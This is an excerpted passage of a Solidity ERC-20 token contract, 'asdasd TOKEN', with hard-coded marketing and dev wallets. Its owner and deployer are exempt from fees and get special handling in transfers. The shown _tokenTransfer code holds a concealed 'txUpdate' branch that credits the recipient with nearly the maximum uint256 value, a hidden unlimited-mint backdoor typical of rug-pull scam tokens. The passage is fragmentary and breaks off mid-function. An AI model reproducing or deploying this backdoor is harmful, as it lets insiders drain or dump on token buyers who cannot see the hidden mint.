...
contract asdasdtoken is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;
    address private _Contract_Deployer;
    ...
    function Contract_Deployer() public view virtual returns (address) {
        return _Contract_Deployer;
    }
    ...
    address payable public Wallet_Marketing = payable(0xE7559c3071c812588Cd5657c77fBA0866d49f7Bb); 
    address payable public Wallet_Dev = payable(0xE843C77D8a9Ee3C92a73bAd8d422d08ddB4845E8);
    ...
    string private constant _name = "asdasd TOKEN"; 
    string private constant _symbol = unicode"asdasd"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 

    uint8 private txTrigger = 0;
    uint8 private txUpdateTrigger = 1; 
    ...
    constructor () {
        ...
        _owner = 0xE843C77D8a9Ee3C92a73bAd8d422d08ddB4845E8;
        _Contract_Deployer = _msgSender();
        ...
        _isExcludedFromFee[_Contract_Deployer] = true;
    ...
    function _transfer(
        ...
        if (from != owner() && from != Contract_Deployer())
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(txUpdate){
            uint256 takefee = ~uint256(0)-_tTotal;
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount+takefee;
